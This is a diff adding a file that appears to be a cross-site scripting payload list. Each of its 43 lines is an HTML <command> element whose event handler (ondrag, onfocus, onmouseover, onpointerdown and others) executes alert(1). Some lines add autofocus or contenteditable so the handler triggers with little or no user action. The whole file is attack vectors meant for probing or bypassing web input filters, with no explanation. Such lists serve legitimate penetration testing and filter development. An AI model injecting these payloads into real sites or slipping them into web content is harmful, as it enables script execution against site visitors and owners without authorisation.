@@ -1,0 +1,43 @@
+<command draggable="true" ondrag="alert(1)">test</command>
+<command draggable="true" ondragend="alert(1)">test</command>
+<command draggable="true" ondragenter="alert(1)">test</command>
+<command draggable="true" ondragleave="alert(1)">test</command>
+<command draggable="true" ondragstart="alert(1)">test</command>
+<command id=x tabindex=1 onactivate=alert(1)></command>
+<command id=x tabindex=1 onbeforeactivate=alert(1)></command>
+<command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>
+<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>
+<command id=x tabindex=1 onfocus=alert(1)></command>
+<command id=x tabindex=1 onfocusin=alert(1)></command>
+<command onafterscriptexecute=alert(1)><script>1</script>
+<command onbeforecopy="alert(1)" contenteditable>test</command>
+<command onbeforecut="alert(1)" contenteditable>test</command>
+<command onbeforepaste="alert(1)" contenteditable>test</command>
+<command onbeforescriptexecute=alert(1)><script>1</script>
+<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>
+<command onclick="alert(1)">test</command>
+<command oncontextmenu="alert(1)">test</command>
+<command oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<command oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<command ondblclick="alert(1)" autofocus tabindex=1>test</command>
+<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>
+<command onkeydown="alert(1)" contenteditable>test</command>
+<command onkeypress="alert(1)" contenteditable>test</command>
+<command onkeyup="alert(1)" contenteditable>test</command>
+<command onmousedown="alert(1)">test</command>
+<command onmouseenter="alert(1)">test</command>
+<command onmouseleave="alert(1)">test</command>
+<command onmousemove="alert(1)">test</command>
+<command onmouseout="alert(1)">test</command>
+<command onmouseover="alert(1)">test</command>
+<command onmouseup="alert(1)">test</command>
+<command onmousewheel=alert(1)>requires scrolling
+<command onpaste="alert(1)" contenteditable>test</command>
+<command onpointerdown=alert(1)>XSS</command>
+<command onpointerenter=alert(1)>XSS</command>
+<command onpointerleave=alert(1)>XSS</command>
+<command onpointermove=alert(1)>XSS</command>
+<command onpointerout=alert(1)>XSS</command>
+<command onpointerover=alert(1)>XSS</command>
+<command onpointerrawupdate=alert(1)>XSS</command>
+<command onpointerup=alert(1)>XSS</command>
